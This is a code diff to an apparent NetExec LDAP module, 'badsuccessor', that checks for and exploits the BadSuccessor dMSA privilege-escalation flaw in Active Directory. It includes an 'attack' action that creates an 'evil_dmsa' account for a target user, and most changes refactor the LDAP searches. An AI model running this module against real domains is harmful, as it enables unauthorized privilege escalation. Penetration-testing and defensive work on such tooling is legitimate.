@@ -1,8 +1,9 @@
-from impacket.ldap import ldaptypes, ldap, ldapasn1 
-from nxc.parsers.ldap_results import parse_result_attributes
+import datetime
+import secrets
+
+from impacket.ldap import ldap, ldapasn1, ldaptypes
 from ldap3.protocol.microsoft import security_descriptor_control
-import datetime # Added
-import secrets  # Added
+from nxc.parsers.ldap_results import parse_result_attributes
 
 RELEVANT_OBJECT_TYPES = {
     "00000000-0000-0000-0000-000000000000": "All Objects",
@@ -84,14 +85,14 @@ class NXCModule:
     """
 
     name = "badsuccessor"
-    description = "Check for and exploit BadSuccessor vulnerability (dMSA privilege escalation)." # Updated description
+    description = "Check for and exploit BadSuccessor vulnerability (dMSA privilege escalation)."
     supported_protocols = ["ldap"]
-    opsec_safe = True # Attack itself modifies AD, so not entirely "safe" in terms of detection if auditing is in place. User discretion advised.
+    opsec_safe = True
     multiple_hosts = True
 
     def __init__(self):
         self.context = None
-        self.module_options = {} # Initialize module_options
+        self.module_options = {}
         self.action = "check"
         self.target_user = None
         self.dmsa_name = "evil_dmsa"
@@ -121,18 +122,15 @@ class NXCModule:
         self.ou_dn_option = self.module_options.get("OU_DN")
         self.dmsa_full_dn_cleanup = self.module_options.get("DMSA_FULL_DN")
 
+        # Validate options based on action
         if self.action == "attack":
             if not self.target_user:
                 context.log.error("TARGET_USER option is required for the 'attack' action.")
-                return False # Indicate failure to prevent on_login
             if not self.dmsa_name:
                 context.log.error("DMSA_NAME option is required for the 'attack' action.")
-                return False
         elif self.action == "cleanup":
             if not self.dmsa_full_dn_cleanup:
                 context.log.error("DMSA_FULL_DN option is required for the 'cleanup' action.")
-                return False
-        return True # Indicate success
 
     def is_excluded_sid(self, sid, domain_sid):
         if sid in EXCLUDED_SIDS:
@@ -149,6 +147,7 @@ class NXCModule:
         parsed = parse_result_attributes(r)
         if parsed and "objectSid" in parsed[0]:
             return parsed[0]["objectSid"]
+        return None
 
     def find_bad_successor_ous(self, ldap_session, entries, base_dn):
         domain_sid = self.get_domain_sid(ldap_session, base_dn)
@@ -231,17 +230,11 @@ class NXCModule:
             self.domain_name = '.'.join(parts)
             self.context.log.debug(f"Derived domain name: {self.domain_name}")
 
-            # Get schema naming context
-            # Corrected the search call to use positional arguments for scope and others
-            root_dse = connection.ldap_connection.search(
-                searchBase="",
-                scope=ldap.SCOPE_BASE,  # Or use integer 0
-                derefAliases=ldap.DEREF_NEVER, # Or use integer 0
-                sizeLimit=0,
-                timeLimit=0,
-                typesOnly=0,
+            # Get schema naming context from RootDSE
+            root_dse = connection.search(
                 searchFilter="(objectClass=*)",
-                attributes=["schemaNamingContext"]
+                attributes=["schemaNamingContext"],
+                baseDN=""
             )
             parsed_root_dse = parse_result_attributes(root_dse)
             if parsed_root_dse and "schemaNamingContext" in parsed_root_dse[0]:
@@ -270,12 +263,14 @@ class NXCModule:
         for element_name, ldap_filter in dmsa_schema_elements.items():
             search_filter = f"(&(cn={element_name}){ldap_filter})"
             try:
-                resp = connection.ldap_connection.search(
-                    searchBase=self.schema_naming_context,
+                # Use NetExec's search method for consistency
+                resp = connection.search(
                     searchFilter=search_filter,
-                    attributes=["cn"]
+                    attributes=["cn"],
+                    baseDN=self.schema_naming_context
                 )
-                if not resp:
+                parsed_resp = parse_result_attributes(resp)
+                if not parsed_resp:
                     self.context.log.warn(f"  Schema element missing: {element_name}")
                     found_all = False
                 else:
@@ -295,8 +290,7 @@ class NXCModule:
         self.context.log.info(f"Attempting to find DN for user: {username}")
         search_filter = f"(&(objectClass=user)(sAMAccountName={username}))"
         try:
-            resp = connection.ldap_connection.search(
-                searchBase=connection.ldap_connection._baseDN,
+            resp = connection.search(
                 searchFilter=search_filter,
                 attributes=["distinguishedName"]
             )
@@ -319,11 +313,13 @@ class NXCModule:
         controls = security_descriptor_control(sdflags=0x04) # DACL_SECURITY_INFORMATION
         
         try:
+            # Use direct ldap_connection.search for security descriptor controls
             resp = connection.ldap_connection.search(
                 searchBase=connection.ldap_connection._baseDN,
                 searchFilter="(objectClass=organizationalUnit)",
                 attributes=["distinguishedName", "nTSecurityDescriptor", "name"],
-                searchControls=controls
+                sizeLimit=0,
+                searchControls=[controls]
             )
             parsed_resp = parse_result_attributes(resp)
 
